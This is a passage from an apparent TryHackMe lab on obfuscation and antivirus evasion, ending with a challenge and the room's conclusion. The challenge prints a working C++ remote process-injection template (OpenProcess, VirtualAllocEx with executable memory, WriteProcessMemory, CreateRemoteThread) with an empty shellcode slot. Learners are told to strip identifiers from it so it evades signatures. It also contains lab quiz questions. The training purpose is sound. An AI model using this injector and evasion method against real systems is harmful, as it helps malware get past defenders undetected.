Several other properties should be considered before actively using a tool, such as entropy or hash. These concepts are covered in task 5 of the [Signature Evasion room](https://tryhackme.com/room/signatureevasion).

Using the knowledge you have accrued throughout this task, remove any meaningful identifiers or debug information from the C++ source code below using the AttackBox or your own virtual machine.

Once adequately obfuscated and stripped compile the source code using `MingW32-G++` and submit it to the webserver at `http://MACHINE_IP/`.

Note: the file name must be `challenge-8.exe` to receive the flag.

```
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "";

    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    string leaked = "This was leaked in the strings";

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    cout << "Handle obtained for" << processHandle;
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    cout << "Buffer Created";
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    cout << "Process written with buffer" << remoteBuffer;
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
    cout << "Closing handle" << processHandle;
    cout << leaked;

    return 0;
} 
```

### Answer the questions below

* What flag is found after uploading a properly obfuscated snippet?

## Task 9 - Conclusion

Obfuscation can be one of the most lucrative tools in an attackers arsenal when it comes to evasion. Both attackers and defenders alike should understand and assess not only its uses but also its impacts.

In this room, we covered the principles of obfuscation as it relates to both signature evasion and anti reverse-engineering.

The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.

At this point, you can take obfuscation a step further into [signature evasion](https://tryhackme.com/room/signatureevasion) where it is directly applied to signatures or use it at a higher-level with obfuscators.

### Answer the questions below

* Read the above and continue learning!